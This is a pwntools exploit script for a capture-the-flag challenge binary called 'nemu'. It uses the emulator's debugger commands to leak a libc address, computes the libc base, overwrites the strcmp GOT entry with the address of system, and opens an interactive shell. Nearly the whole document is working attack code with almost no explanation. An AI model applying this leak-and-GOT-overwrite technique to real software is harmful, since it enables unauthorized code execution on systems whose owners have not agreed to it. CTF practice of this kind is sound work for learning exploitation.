from pwn import *
filename="./nemu"
libc_name="./libc-2.23.so"
io = process(filename)
# context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']

def send(con):
    io.recvuntil('(nemu)')
    io.sendline(con)

def debug(breao=True):
    cmd= ""
    cmd += "dir /home/nicholas/Desktop/pwn/tqlctf/nemu/nemu_source_code/nemu\n"
    cmd +="b vaddr_read\n"
    cmd +="b vaddr_write\n"
    cmd +="b paddr_read\n"
    cmd +="b paddr_write\n"
    cmd +="b cmd_set\n"
    cmd +="b cmd_w\n"
    gdb.attach(io,cmd)
    if(breao):
        send('x 0x100')


# send('x 0x8001d88') # get part libc
# io.recvuntil('      ')
# libc_info1 = int(io.recvuntil('\n',drop=True),16) # the low addr
# send('x 0x8001d8c') 
# io.recvuntil('      ')
# libc_info2 = int(io.recvuntil('\n',drop=True),16) # the high addr
# libc_info = (libc_info2 << 32) + (libc_info1)
# success("libc_info: " + hex(libc_info))
# libc_base = libc_info - 0x3c4ce8
# success("libc_base: " + hex(libc_base))

# set head to sth before GOT
send('set 0x8000448 0x60eff0')
# debug(False)
send('info w')
io.recvuntil('0x')
libc_info1 = int(io.recvuntil(' ',drop=True),16)
io.recvuntil('0x')
libc_info2 = int(io.recvuntil('\n',drop=True),16)
libc_info = (libc_info2<<32)+libc_info1
success("libc_info: " + hex(libc_info))
# debug()
libc_base = libc_info - 0x084540
success("libc_base: " + hex(libc_base))
# io.recvuntil('0x')


strcmp_got = 0x000000000060f0f0
system = (libc_base + libc.sym['system']) &0xffffffff
target_addr = strcmp_got -0x30
send('set 0x8000448 0')
# change head to strcmp's got
send('set 0x8000440 0x%x' % target_addr)
# change
# debug()
send('w 0x%x' % system)


info("/bin/sh\x00")

io.interactive()
